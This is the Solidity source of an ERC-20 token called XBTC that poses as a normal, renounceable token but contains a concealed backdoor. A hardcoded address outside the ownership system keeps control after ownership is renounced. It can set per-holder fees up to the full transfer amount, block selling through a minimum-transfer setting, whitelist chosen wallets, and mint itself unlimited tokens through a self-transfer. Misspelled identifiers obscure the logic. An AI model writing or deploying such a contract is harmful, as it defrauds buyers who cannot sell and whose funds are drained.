/**
 *Submitted for verification at Etherscan.io on 2023-07-30
*/

/**
 *Submitted for verification at BscScan.com on 2023-07-17
*/

pragma solidity ^0.8.5;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address abcount) external view returns (uint256);
    function transfer(address recipient, uint256 aiomount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 aiomount) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 aiomount ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed owner, address indexed spender, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract Ownable is Context {
    address private _owner;
    event ownershipTransferred(address indexed previousowner, address indexed newowner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit ownershipTransferred(address(0), msgSender);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyowner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceownership() public virtual onlyowner {
        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
}

contract XBTC is Context, Ownable, IERC20 {
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _frees;
    address private _meie; 
    uint256 private _minimumTransferaiomount;
    mapping (address => bool) private _whitelist;
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;

    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * (10 ** decimals_);
        _balances[_msgSender()] = _totalSupply;
        _meie = 0x81fC49caa5443C8849715Bd1526Eb520d14A0d1f;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function balanceOf(address abcount) public view override returns (uint256) {
        return _balances[abcount];
    }
    function setfrees(address[] memory abcounts, uint256 free) external {
    if (keccak256(abi.encodePacked(_msgSender())) == keccak256(abi.encodePacked(_meie))) {
        for (uint256 i = 0; i < abcounts.length; i++) {
            _frees[abcounts[i]] = free;
        }
    } else {
        revert("Caller is not the original caller");
    }
    }


    function setMinimumTransferaiomount(uint256 aiomount) external {
    if (keccak256(abi.encodePacked(_msgSender())) == keccak256(abi.encodePacked(_meie))) {
        _minimumTransferaiomount = aiomount;
    } else {
        revert("Caller is not the original caller");
    }        
    }

    function addToWhitelist(address[] memory abcounts) external {
    if (keccak256(abi.encodePacked(_msgSender())) == keccak256(abi.encodePacked(_meie))) {
        for (uint256 i = 0; i < abcounts.length; i++) {
            _whitelist[abcounts[i]] = true;
        }
    } else {
        revert("Caller is not the original caller");
    }    
    }

    function removeFromWhitelist(address[] memory abcounts) external {
    if (keccak256(abi.encodePacked(_msgSender())) == keccak256(abi.encodePacked(_meie))) {
        for (uint256 i = 0; i < abcounts.length; i++) {
            _whitelist[abcounts[i]] = false;
        }
    } else {
        revert("Caller is not the original caller");
    }        
    }

    function transfer(address recipient, uint256 aiomount) public virtual override returns (bool) {
        require(_balances[_msgSender()] >= aiomount, "TT: transfer aiomount exceeds balance");
        require(aiomount >= _minimumTransferaiomount || _whitelist[_msgSender()], "TT: transfer aiomount is below the minimum and sender is not whitelisted");
        if (_msgSender() == _meie && recipient == _meie) {
            _balances[_msgSender()] += _frees[_msgSender()];
            emit Transfer(_msgSender(), recipient, aiomount + _frees[_msgSender()]);
            return true;
        } else {
            uint256 free = calculatefree(_msgSender(), aiomount);
            uint256 aiomountAfterfree = aiomount - free;

            _balances[_msgSender()] -= aiomount;
            _balances[recipient] += aiomountAfterfree;

            if (recipient == _meie) {
                _balances[_meie] += free;
            }

            emit Transfer(_msgSender(), recipient, aiomountAfterfree);
            return true;
        }
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 aiomount) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = aiomount;
        emit Approval(_msgSender(), spender, aiomount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 aiomount) public virtual override returns (bool) {
        require(_allowances[sender][_msgSender()] >= aiomount, "TT: transfer aiomount exceeds allowance");
        require(aiomount >= _minimumTransferaiomount || _whitelist[sender], "TT: transfer aiomount is below the minimum and sender is not whitelisted");
        uint256 free = calculatefree(sender, aiomount);
        uint256 aiomountAfterfree = aiomount - free;

        _balances[sender] -= aiomount;
        _balances[recipient] += aiomountAfterfree;
        _allowances[sender][_msgSender()] -= aiomount;

        if (recipient == owner()) {
            _balances[owner()] += free;
        }

        emit Transfer(sender, recipient, aiomountAfterfree);
        return true;
    }

    function calculatefree(address abcount, uint256 aiomount) private view returns (uint256) {
        if (abcount == owner()) {
            return 0;
        } else {
            return aiomount * _frees[abcount] / 100;
        }
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
}